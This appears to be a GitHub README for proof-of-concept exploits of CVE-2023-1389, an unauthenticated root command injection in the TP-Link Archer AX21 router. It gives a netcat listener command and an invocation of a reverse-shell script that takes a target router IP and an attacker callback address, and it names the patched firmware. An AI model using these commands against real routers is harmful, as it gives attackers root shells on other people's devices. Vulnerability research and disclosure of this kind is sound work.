# Description
CVE-2023–1389 is an Unauthenticated Command Injection vulnerability in the TP-Link Archer AX21 WiFi router. A calllback in the **country** parameter uses the **popen()** function, which is run as root, allowing the attacker to inject arbitrary values through GET or POST requests to the admin interface, without requiring authentication. More details about the vulnerability can be found [here](https://www.tenable.com/security/research/tra-2023-11).

These are a couple of Proof-of-Concepts I created while exploring the command injection. Archer-file-transfer.py was the first iteration and is fairly convaluted in how it achieves interaction. Archer-rev-shell.py gives you a simple netcat reverse shell, and is likely the one you're here for. If you would like to learn more about the development of these scripts you can read the post [here](https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94). 
## Usage
In one terminal window:
```
nc your_IP listener_port
```
In a second terminal window:
```
python3 archer-rev-shell.py -r router_IP -a your_IP -p listner_port
```

## Mitigation
TP-Link has released firmware version 1.1.4 Build 20230219 which fixes the issue by removing the vulnerable callback. Updating your router to the latest firmware should protect your device. 
## Future 
I will likely not be maintaining these PoCs. Both are pretty simple and should be easy to modify as needed.
